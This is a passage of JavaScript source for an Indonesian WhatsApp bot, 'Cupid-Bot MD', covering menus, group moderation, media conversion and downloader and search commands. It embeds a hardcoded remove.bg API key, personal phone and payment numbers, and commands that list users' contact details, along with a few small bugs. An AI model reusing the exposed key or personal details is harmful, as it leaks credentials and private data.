│• ${prefix}sound3
│• ${prefix}sound4
│• ${prefix}sound5
│• ${prefix}sound6
│• ${prefix}sound7
│• ${prefix}sound8
│• ${prefix}sound9
│• ${prefix}sound10
│• ${prefix}sound11
│• ${prefix}sound12
│• ${prefix}sound13
│• ${prefix}sound14
│• ${prefix}sound15
│• ${prefix}sound16
│• ${prefix}sound17
│• ${prefix}sound18
│• ${prefix}sound19
│• ${prefix}sound20
│• ${prefix}sound21
│• ${prefix}sound22
│• ${prefix}sound23
│• ${prefix}sound24
│• ${prefix}sound25
│• ${prefix}sound26
│• ${prefix}sound27
│• ${prefix}sound28
│• ${prefix}sound29
│• ${prefix}sound30
│• ${prefix}sound31
│• ${prefix}sound32
│• ${prefix}sound33
│• ${prefix}sound34
│• ${prefix}sound35
│• ${prefix}sound36
│• ${prefix}sound37
│• ${prefix}sound38
│• ${prefix}sound39
│• ${prefix}sound40
│• ${prefix}sound41
│• ${prefix}sound42
│• ${prefix}sound43
│• ${prefix}sound44
│• ${prefix}sound45
│• ${prefix}sound46
│• ${prefix}sound47
│• ${prefix}sound48
│• ${prefix}sound49
│• ${prefix}sound50
│• ${prefix}sound51
│• ${prefix}sound52
│• ${prefix}sound53
│• ${prefix}sound54
│• ${prefix}sound55
│• ${prefix}sound56
│• ${prefix}sound57
│• ${prefix}sound58
│• ${prefix}sound59
│• ${prefix}sound60
│• ${prefix}sound61
│• ${prefix}sound62
│• ${prefix}sound63
│• ${prefix}sound64
│• ${prefix}sound65
│• ${prefix}sound66
│• ${prefix}sound67
│• ${prefix}sound68
│• ${prefix}sound69
│• ${prefix}sound70
│• ${prefix}sound71
│• ${prefix}sound72
│• ${prefix}sound73
│• ${prefix}sound74
└──────────────☉
`
zeroyt7.sendMessage(from, { viewOnce : true, caption: soundm, image: thumbnail, templateButtons: buttons2, footer: creator, mentions: [m.sender] })
}
break
case 'animemenu': {
animem = `
┌─────☉「 Anime Menu 」
│• ${prefix}cry
│• ${prefix}hug
│• ${prefix}pat
│• ${prefix}bully
│• ${prefix}lick
│• ${prefix}kiss
│• ${prefix}awoo
│• ${prefix}waifu
│• ${prefix}shinobu
│• ${prefix}cuddle
│• ${prefix}megumin
│• ${prefix}slap
│• ${prefix}neko
│• ${prefix}wink
│• ${prefix}dance
│• ${prefix}poke
│• ${prefix}glomp
│• ${prefix}bite
│• ${prefix}nom
│• ${prefix}handhold
│• ${prefix}highfive
│• ${prefix}wave
│• ${prefix}smug
│• ${prefix}smile
│• ${prefix}bonk
└──────────────☉
`
zeroyt7.sendMessage(from, { viewOnce : true, caption: animem, image: thumbnail, templateButtons: buttons2, footer: creator, mentions: [m.sender] })
}
break
case 'islamicmenu': {
islamicm = `
┌─────☉「 Islamic Menu 」
│• ${prefix}kisahnabi
│• ${prefix}niatsholat
│• ${prefix}asmaulhusna
│• ${prefix}doaharian
│• ${prefix}bacaansholat
└──────────────☉
`
zeroyt7.sendMessage(from, { viewOnce : true, caption: islamicm, image: thumbnail, templateButtons: buttons2, footer: creator, mentions: [m.sender] })
}
break

case 'linkgroup': {
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botAdmin)
let response = await zeroyt7.groupInviteCode(from)
zeroyt7.sendText(from, `https://chat.whatsapp.com/${response}\n\n• Link Group : ${groupMetadata.subject}`, fkontak, { detectLink: true })
}
break
case 'ephemeral': {
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!isAdmins) return reply(mess.admin)
if (args[0] === 'enable') {
await zeroyt7.sendMessage(from, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL }).then((res) => reply(mess.success)).catch((err) => reply(jsonformat(err)))
} else if (args[0] === 'disable') {
await zeroyt7.sendMessage(from, { disappearingMessagesInChat: false }).then((res) => reply(mess.success)).catch((err) => reply(jsonformat(err)))
} else {
let buttons = [
{ buttonId: 'ephemeral enable', buttonText: { displayText: 'Aktif' }, type: 1 },
{ buttonId: 'ephemeral disable', buttonText: { displayText: 'Nonaktif' }, type: 1 }
]
await zeroyt7.sendButtonText(from, buttons, `Silahkan Pilih Mode Group`, creator, fkontak)
}
}
break
case 'setppgroup': {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!quoted) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
let media = await zeroyt7.downloadAndSaveMediaMessage(quoted)
await zeroyt7.updateProfilePicture(from, { url: media }).catch((err) => fs.unlinkSync(media))
reply(mess.success)
}
break
case 'setname': {
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!isAdmins) return reply(mess.admin)
if (!text) return reply( 'Textnya Mana Kak ?')
await zeroyt7.groupUpdateSubject(from, text).then((res) => reply(mess.success)).catch((err) => reply(jsonformat(err)))
}
break
case 'setdesc': {
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!isAdmins) return reply(mess.admin)
if (!text) return reply( 'Textnya Mana Kak ?')
await zeroyt7.groupUpdateDescription(from, text).then((res) => zeroyt7(mess.success)).catch((err) => reply(jsonformat(err)))
}
break
case 'group': {
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!isAdmins) return reply(mess.admin)
if (args[0] === 'close'){
await zeroyt7.groupSettingUpdate(from, 'announcement').then((res) => reply(`Sukses Menutup Group`)).catch((err) => reply(jsonformat(err)))
} else if (args[0] === 'open'){
await zeroyt7.groupSettingUpdate(from, 'not_announcement').then((res) => reply(`Sukses Membuka Group`)).catch((err) => reply(jsonformat(err)))
} else {
let buttons = [
{ buttonId: 'group open', buttonText: { displayText: 'Buka' }, type: 1 },
{ buttonId: 'group close', buttonText: { displayText: 'Tutup' }, type: 1 }
]
await zeroyt7.sendButtonText(from, buttons, `Silahkan Pilih Mode Group`, creator, fkontak)
}
}
break
case 'editinfo': {
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!isAdmins) return reply(mess.admin)
if (args[0] === 'open'){
await zeroyt7.groupSettingUpdate(from, 'unlocked').then((res) => reply(`Sukses Membuka Edit Info Group`)).catch((err) => reply(jsonformat(err)))
} else if (args[0] === 'close'){
await zeroyt7.groupSettingUpdate(from, 'locked').then((res) => reply(`Sukses Menutup Edit Info Group`)).catch((err) => reply(jsonformat(err)))
} else {
let buttons = [
{ buttonId: 'editinfo open', buttonText: { displayText: 'Buka' }, type: 1 },
{ buttonId: 'editinfo close', buttonText: { displayText: 'Tutup' }, type: 1 }
]
await zeroyt7.sendButtonText(from, buttons, `Silahkan Pilih Mode Edit Info`, creator, fkontak)
}
}
break
case 'add': {
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!isAdmins) return reply(mess.admin)
let add = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await zeroyt7.groupParticipantsUpdate(from, [add], 'add').then((res) => reply(mess.success)).catch((err) => reply(jsonformat(err)))
}
break
case 'kick': {
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!isAdmins) return reply(mess.admin)
let kick = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await zeroyt7.groupParticipantsUpdate(from, [kick], 'remove').then((res) => reply(mess.success)).catch((err) => reply(jsonformat(err)))
}
break
case 'hidetag': {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins) return reply(mess.admin)
zeroyt7.sendMessage(from, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: fkontak })
}
break
case 'tagall': {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins) return reply(mess.admin)
let teks = `「 ᴛᴀɢ ᴀʟʟ 」
 
*[ PESAN ]* : _${q ? q : 'kosong'}_\n\n`
for (let mem of participants) {
teks += `★ @${mem.id.split('@')[0]}\n`
}
zeroyt7.sendMessage(from, { text: teks, mentions: participants.map(a => a.id) }, { quoted: fkontak })
}
break
case 'promote': {
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!isAdmins) return reply(mess.admin)
let promote = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await zeroyt7.groupParticipantsUpdate(from, [promote], 'promote').then((res) => reply(mess.success)).catch((err) => reply(jsonformat(err)))
}
break
case 'demote': {
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!isAdmins) return reply(mess.admin)
let demote = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await zeroyt7.groupParticipantsUpdate(from, [demote], 'demote').then((res) => reply(mess.success)).catch((err) => reply(jsonformat(err)))
}
break
case 'antilink': {
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply( mess.botAdmin)
if (!isAdmins && !isOwner) return reply(mess.admin)
if (args[0] === 'enable'){
if (isAntilink) return reply(`*[ ANTILINK ]* Sudah Aktif Sebelumnya !`)
antilink.push(from)
fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink))
reply('*[ ANTILINK DI AKTIFKAN ]*\n\nYang Mengirim Link Group Akan Di Kick Otomatis Oleh Bot !')
} else if (args[0] === 'disable') { if (!isAntilink) return reply(`*[ ANTILINK ] Sudah Tidak Aktif Sebelumnya !*`)
anu = antilink.indexOf(from)
antilink.splice(anu, 1)
fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink))
reply('*[ ANTILINK DI NONAKTIFKAN ]*\n\nSemua Member Boleh Mengirimkan Link Group')
} else {
let buttons = [
{ buttonId: 'antilink enable', buttonText: { displayText: 'Aktif' }, type: 1 },
{ buttonId: 'antilink disable', buttonText: { displayText: 'Nonaktif' }, type: 1 }
]
await zeroyt7.sendButtonText(from, buttons, `Silahkan Pilih Mode Antilink`, creator, fkontak)
}
}
break
case 'listonline': {
if (!m.isGroup) return reply(mess.group)
let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
let online = [...Object.keys(store.presences[id]), botNumber]
zeroyt7.sendText(from, 'List Online :\n\n' + online.map(v => '• @' + v.replace(/@.+/, '')).join`\n`, fkontak, { mentions: online })
}
break
case 'toimage': {
if (!quoted) return reply('Reply Image')
if (!/webp/.test(mime)) return reply(`Balas Sticker Dengan Caption *${prefix + command}*`)
reply(mess.wait)
let toimage = await zeroyt7.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${toimage} ${ran}`, (err) => {
fs.unlinkSync(toimage)
if (err) return reply(err)
let buffer = fs.readFileSync(ran)
zeroyt7.sendMessage(from, { image: buffer }, { quoted: fkontak })
fs.unlinkSync(ran)
})
}
break
case 'removebg': {
if (!quoted) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
let remobg = require('remove.bg')
let apirnobg = ['qpmjqVVpD6Ca5p6uo4MEDFRF']
let apinobg = apirnobg[Math.floor(Math.random() * apirnobg.length)]
hmm = await './pth/sampah/remobg-'+getRandom('')
localFile = await zeroyt7.downloadAndSaveMediaMessage(quoted, hmm)
outputFile = await './pth/sampah/hremo-'+getRandom('.png')
reply(mess.wait)
remobg.removeBackgroundFromImageFile({
path: localFile,
apiKey: apinobg,
size: "regular",
type: "auto",
scale: "100%",
outputFile 
}).then(async result => {
zeroyt7.sendMessage(from, {image: fs.readFileSync(outputFile), caption: mess.success}, { quoted : fkontak })
await fs.unlinkSync(localFile)
await fs.unlinkSync(outputFile)
})
}
break
case 'sticker': case 's': {
if (!quoted) return reply(`Balas Video/Image Dengan Caption ${prefix + command}`)
reply(mess.wait)
if (/image/.test(mime)) {
let sticker = await quoted.download()
let encmedia = await zeroyt7.sendImageAsSticker(from, sticker, fkontak, { packname: `✪──────────┐\n┌  Cupid-Bot MD  ┘\n└──────────✪\n\nNomor Bot :\n6285156357190\n\nInstagram :\n@zidnicupid_\n\nTikTok :\n@sejedewe991`, author: `` })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) reply('Maksimal 10 detik!')
let stiker = await quoted.download()
let encmedia = await zeroyt7.sendVideoAsSticker(from, stike, fkontak, { packname: `✪──────────┐\n┌  Cupid-Bot MD  ┘\n└──────────✪\n\nNomor Bot :\n6285156357190\n\nInstagram :\n@zidnicupid_\n\nTikTok :\n@sejedewe991`, author: `` })
await fs.unlinkSync(encmedia)
} else {
reply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
}
}
break
case 'tovideo': {
if (!quoted) return reply('Reply Image')
if (!/webp/.test(mime)) return reply(`Balas Sticker Dengan Caption *${prefix + command}*`)
reply(mess.wait)
let { webp2mp4File } = require('../message/uploader')
let video = await zeroyt7.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(video)
await zeroyt7.sendMessage(from, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video'} }, { quoted: fkontak })
await fs.unlinkSync(video)
}
break
case 'togif': {
if (!quoted) return reply('Reply Image')
if (!/webp/.test(mime)) return reply(`Balas Stiker Dengan Caption *${prefix + command}*`)
reply(mess.wait)
let { webp2mp4File } = require('../message/uploader')
let gif = await zeroyt7.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(gif)
await zeroyt7.sendMessage(from, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: fkontak })
await fs.unlinkSync(gif)
}
break
case 'tourl': {
reply(mess.wait)
let { UploadFileUgu, webp2mp4File, TelegraPh } = require('../message/uploader')
let url = await zeroyt7.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anu = await TelegraPh(url)
reply(util.format(anu))
} else if (!/image/.test(mime)) {
let anu = await UploadFileUgu(url)
reply(util.format(anu))
}
await fs.unlinkSync(url)
}
break
case 'tomp3': {
if (/document/.test(mime)) return reply(`Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`)
if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`)
if (!quoted) return reply(`Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`)
reply(mess.wait)
let mp3 = await quoted.download()
let { toAudio } = require('../message/converter')
let audio = await toAudio(mp3, 'mp4')
zeroyt7.sendMessage(from, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By Cupid-Bot MD.mp3`}, { quoted : fkontak })
}
break
case 'tovn': {
if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`Reply Video/Audio Yang Ingin Dijadikan VN Dengan Caption ${prefix + command}`)
if (!quoted) return reply(`Reply Video/Audio Yang Ingin Dijadikan VN Dengan Caption ${prefix + command}`)
reply(mess.wait)
let vn = await quoted.download()
let { toPTT } = require('../message/converter')
let audio = await toPTT(vn, 'mp4')
zeroyt7.sendMessage(from, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:fkontak})
}
break
case 'join': {
if (!isOwner) return reply(mess.owner)
if (!text) return reply('Masukkan Link Group!')
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply('Link Invalid!')
reply(mess.wait)
let join = args[0].split('https://chat.whatsapp.com/')[1]
await zeroyt7.groupAcceptInvite(join).then((res) => reply(mess.success)).catch((err) => reply(jsonformat(err)))
}
break
case 'leave': {
if (!isOwner) return reply(mess.owner)
await zeroyt7.groupLeave(from).then((res) => reply(mess.success)).catch((err) => reply(jsonformat(err)))
}
break
case 'block': {
if (!isOwner) return reply(mess.owner)
let block = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await zeroyt7.updateBlockStatus(block, 'block').then((res) => reply(mess.success)).catch((err) => reply(jsonformat(err)))
}
break
case 'unblock': {
if (!isOwner) return reply(mess.owner)
let unblock = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await zeroyt7.updateBlockStatus(unblock, 'unblock').then((res) => reply(mess.success)).catch((err) => reply(jsonformat(err)))
}
break
case 'setppbot': {
if (!isOwner) return reply(mess.owner)
if (!quoted) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
let media = await zeroyt7.downloadAndSaveMediaMessage(quoted)
await zeroyt7.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
reply(mess.success)
}
break
case 'setbio': {
if (!isOwner) return reply(mess.owner)
if (!text) return reply(`Textnya Mana Kak ?`)
zeroyt7.setStatus(q)
reply(`*Bio Telah Di Ganti Menjadi ${q}*`)
}
break
case 'listpc': {
if (!isOwner) return reply(mess.owner)
let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
let teks = `* [ LIST PERSONAL CHAT ]*\n\nTotal Chat : ${anu.length} Chat\n\n`
for (let i of anu) {
let nama = store.messages[i].array[0].pushName
teks += `• *Nama :* ${nama}\n• *User :* @${i.split('@')[0]}\n• *Chat :* https://wa.me/${i.split('@')[0]}\n\n=====================\n\n`
}
zeroyt7.sendTextWithMentions(from, teks, fkontak)
}
break
case 'listgc': {
if (!isOwner) return reply(mess.owner)
let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
let teks = `*[ LIST GROUP CHAT ]*\n\nTotal Group : ${anu.length} Group\n\n`
for (let i of anu) {
let metadata = await zeroyt7.groupMetadata(i)
teks += `• *Nama :* ${metadata.subject}\n• *Owner :* @${metadata.owner.split('@')[0]}\n• *ID :* ${metadata.id}\n• *Dibuat :* ${moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n• *Member :* ${metadata.participants.length}\n\n=====================\n\n`
}
zeroyt7.sendTextWithMentions(from, teks, fkontak)
}
break
case 'script': {
if (!isOwner) return reply(mess.wrongFormat)
tekssc = ``
zeroyt7.sendMessage(from, { viewOnce : true, caption: tekssc, image: thumbnail, templateButtons: buttons3, footer: `Mau Scriptnya? Itu Kan Ada Tombol Dibawah`, mentions: [ownernya] })
}
break
case 'credit': {
credit = `
Powered : WhatsApp
Source Code : Zero YT7
Thanks To :
• Byzeem
• Pinot
• All Member Cupid-Bot
• All User Cupid-Bot MD
`
zeroyt7.sendMessage(from, { viewOnce : true, caption: credit, image: thumbnail, templateButtons: buttons3, footer: creator, mentions: [m.sender] })
}
break
case 'donate': {
donate =`Scan Gambar Diatas Untuk Donasi
Atau Klik Link https://saweria.co/zidnicupid

Dana/Gopay/Ovo/Pulsa :
0895396237991

Semoga Dilimpahkan Rezekinya🤲`
zeroyt7.sendMessage(from, { viewOnce : true, caption: donate, image: { url: `https://telegra.ph/file/79fd59d7d60b73608ec4d.jpg` }, templateButtons: buttons3, footer: creator, mentions: [m.sender] })
}
break
case 'owner': {
let vcard = `BEGIN:VCARD\n`
+ `VERSION:3.0\n`
+ `N:;${global.ownerName}.;;;`
+ `FN:${global.ownerName}.\n`
+ `ORG:${global.ownerName};\n`
+ `TEL;type=CELL;type=VOICE;waid=${global.owner}:${global.owner}\n`
+ `END:VCARD`
let msg = await zeroyt7.sendMessage(from, { contacts: { displayName: `${global.owner}`, contacts: [{ vcard }] } }, { quoted: ftroli })
let buttons3 = [
{buttonId: `menu`, buttonText: {displayText: '𝗕𝗔𝗖𝗞'}, type: 1},
]
let buttonMessage3 = {
text: `Jangan Nelfon/VC Ownerkuh!!\nChat P No Respon!!\nJangan Manggil Sayang!!`,
footerText: 'Press The Button Below',
buttons: buttons3,
headerType: 2
}
zeroyt7.sendMessage(from, buttonMessage3, { quoted: fkontak })                        
}
break
case 'ytmp3': {
var { yta } = require('../message/scrape/y2mate')
if (!text) return reply(`Masukan Link Youtube Nya\nContoh : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27`)
var quality = args[1] ? args[1] : '128kbps'
var media = await yta(text, quality)
if (media.filesize >= 100000) return reply('File Melebihi Batas '+util.format(media))
txt = `⭔ Title : ${media.title}
⭔ File Size : ${media.filesizeF}
⭔ Url : ${isUrl(text)}
⭔ Ext : MP3
⭔ Resolusi : ${args[1] || '128kbps'}`
zeroyt7.sendImage(from, media.thumb, txt, fkontak)
zeroyt7.sendMessage(from, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp3` }, { quoted: fkontak })
}
break
case 'ytmp4': {
var { ytv } = require('../message/scrape/y2mate')
if (!text) return reply(`Masukan Link Youtube Nya\nContoh : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27`)
var quality = args[1] ? args[1] : '360p'
var media = await ytv(text, quality)
if (media.filesize >= 100000) return reply('File Melebihi Batas '+util.format(media))
txt = `⭔ Title : ${media.title}
⭔ File Size : ${media.filesizeF}
⭔ Url : ${isUrl(text)}
⭔ Ext : MP3
⭔ Resolusi : ${args[1] || '360p'}`
zeroyt7.sendMessage(from, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: txt }, { quoted: fkontak })
}
break
case 'mediafire': {
if (!text) return reply('Masukkan Query Link!')
if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) return reply(`The Link You Provided Is Invalid`)
const baby1 = await mediafireDl(text)
if (baby1[0].size.split('MB')[0] >= 999) return reply('*File Over Limit* '+util.format(baby1))
txt = `*MEDIAFIRE DOWNLOADER*
				
*Name* : ${baby1[0].nama}
*Size* : ${baby1[0].size}
*Mime* : ${baby1[0].mime}
*Link* : ${baby1[0].link}`
reply(`${txt}`)
zeroyt7.sendMessage(from, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : fkontak }).catch ((err) => reply(mess.success))
}
break
case 'gitclone': {
if (!args[0]) return reply(`Masukan Link Github Nya\nContoh : ${prefix}${command} https://github.com/Cupid5/Popeye-MD`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return reply(`Link invalid!!`)
var regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
var [, user, repo] = args[0].match(regex1) || []
repo = repo.replace(/.git$/, '')
var url = `https://api.github.com/repos/${user}/${repo}/zipball`
var filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
zeroyt7.sendMessage(from, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: fkontak }).catch((err) => reply(mess.success))
}
break
case 'tiktoknowm': {
if (!text) return reply(`Masukan Link Tiktok Nya\nContoh : ${prefix + command} https://vt.tiktok.com/ZS8LJNSV3/`)
if (!q.includes('tiktok')) return reply(`Link Invalid!!`)
reply(mess.wait)
require('../message/scrape/tiktok').Tiktok(q).then( data => {
zeroyt7.sendMessage(from, { video: { url: data.nowm }}, { quoted: fkontak })
})
}
break
case 'tiktokaudio': {
if (!text) return reply(`Masukan Link Tiktok Nya\nContoh : ${prefix + command} https://vt.tiktok.com/ZS8LJNSV3/`)
if (!q.includes('tiktok')) return reply(`Link Invalid!!`)
reply(mess.wait)
require('../message/scrape/tiktok').Tiktok(q).then( data => {
zeroyt7.sendMessage(from, { audio: { url: data.audio }, mimetype: 'audio/mp4' }, { quoted: fkontak })
})
}
break
case 'searchgc': {
if (args.length < 1) return reply(`Masukan Nama Group Nya\nContoh :\n${prefix + command} Wibu`)
nae = args.join(" ")
hx.linkwa(nae).then(res => {
teks = '*[ SEARCH GROUP ]*'
for (let i of res) {
teks += `\n\nGroup Whatsapp :\n`
teks += `${i.link}\n`
teks += `${i.nama}`
}
var buttonsne = [
{buttonId: `menu`, buttonText: {displayText: '𝗕𝗔𝗖𝗞'}, type: 1}
]
var zero = {
text: teks,
footer: creator,
buttons: buttonsne,
headerType: 1
}
zeroyt7.sendMessage(from, zero, { quoted : fkontak })
})
}
break
case 'play': {
if (!text) return reply(`Masukan Judul Nya\nContoh : ${prefix + command} Mimpi Yang Sempurna`)
reply(mess.wait)
var yts = require("yt-search")
var search = await yts(text)
var anu = search.videos[Math.floor(Math.random() * search.videos.length)]
var buttons = [
{buttonId: `ytmp3 ${anu.url}`, buttonText: {displayText: '𝗔𝗨𝗗𝗜𝗢'}, type: 1},
{buttonId: `ytmp4 ${anu.url}`, buttonText: {displayText: '𝗩𝗜𝗗𝗘𝗢'}, type: 1}
]
var buttonMessage = {
image: { url: anu.thumbnail },
caption: `
Title : ${anu.title}
Ext : Search
ID : ${anu.videoId}
Duration : ${anu.timestamp}
Viewers : ${anu.views}
Upload At : ${anu.ago}
Author : ${anu.author.name}
Channel : ${anu.author.url}
Url : ${anu.url}`,
footer: creator,
buttons: buttons,
headerType: 4
}
zeroyt7.sendMessage(from, buttonMessage, { quoted: fkontak })
}
break
case 'ytsearch': {
if (!text) return reply(`Masukan Judul Nya\nContoh : ${prefix + command} Script Bot By Pinot`)
reply(mess.wait)
var yts = require("yt-search")
var search = await yts(text)
var teks = 'YouTube Search\n\n Result From '+text+'\n\n'
let no = 1
for (let i of search.all) {
teks +=`No : ${no++}
Type : ${i.type}
Video ID : ${i.videoId}
Title : ${i.title}
Views : ${i.views}
Duration : ${i.timestamp}
Upload At : ${i.ago}
Author : ${i.author.name}
Url : ${i.url}`
}
zeroyt7.sendMessage(from, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: fkontak })
}
break
case 'google': {
if (!text) return reply(`Masukan Judul Nya\nContoh : ${prefix + command} Sandrinna Michelle`)
var google = require('google-it')
google({'query': text}).then(res => {
let teks = `Google Search From : ${text}\n\n`
for (let g of res) {
teks += `*Title* : ${g.title}\n`
teks += `*Description* : ${g.snippet}\n`
teks += `*Link* : ${g.link}`
} 
reply(teks)
})
}
break
case 'gimage': {
if (!text) return reply(`Masukan Judul Nya\nContoh : ${prefix + command} Sandrinna Michelle`)
var gis = require('g-i-s')
gis(text, async (error, result) => {
n = result
images = n[Math.floor(Math.random() * n.length)].url
var buttons = [
{buttonId: `gimage ${text}`, buttonText: {displayText: '𝗡𝗘𝗫𝗧'}, type: 1}
]
var buttonMessage = {
image: { url: images },
caption: `*[ GIMAGE SEARCH ]*
*Query* : ${text}
*Media Url* : ${images}`,
footer: creator,
buttons: buttons,
headerType: 4
}
zeroyt7.sendMessage(from, buttonMessage, { quoted: fkontak })
})
}
break
case 'wallpaper': {
if (!text) return reply(`Masukan Judul Nya\nContoh : ${prefix + command} Naruto`)
reply(mess.wait)
anu = await wallpaper(text)
result = anu[Math.floor(Math.random() * anu.length)]
var buttons = [
{buttonId: `wallpaper ${text}`, buttonText: {displayText: '𝗡𝗘𝗫𝗧'}, type: 1}
]
var buttonMessage = {
image: { url: result.image[0] },
caption: `Title : ${result.title}
Category : ${result.type}
Detail : ${result.source}
Media Url : ${result.image[2] || result.image[1] || result.image[0]}`,
footer: creator,
buttons: buttons,
headerType: 4
}
zeroyt7.sendMessage(from, buttonMessage, { quoted: fkontak })
}
break
case 'wikimedia': {
if (!text) return reply(`Masukan Judul Nya\nContoh : ${prefix + command} Naruto`)
reply(mess.wait)
anu = await wikimedia(text)
result = anu[Math.floor(Math.random() * anu.length)]
var buttons = [
{buttonId: `wikimedia ${text}`, buttonText: {displayText: '𝗡𝗘𝗫𝗧'}, type: 1}
]
let buttonMessage = {
image: { url: result.image },
caption: `Title : ${result.title}
Source : ${result.source}
Media Url : ${result.image}`,
footer: creator,
buttons: buttons,
headerType: 4
}
zeroyt7.sendMessage(from, buttonMessage, { quoted: fkontak })
}
break
case 'ringtone': {
if (!text) return reply(`Masukan Judul Nya\nContoh : ${prefix + command} Nada Dering Iphone`)
reply(mess.wait)
var anu = await ringtone(text)
var result = anu[Math.floor(Math.random() * anu.length)]
zeroyt7.sendMessage(from, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: fkontak })
}
break
case 'fakemore': {
if (args.length < 1) return reply(`Penggunaan ${prefix + command} mem|beri`)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
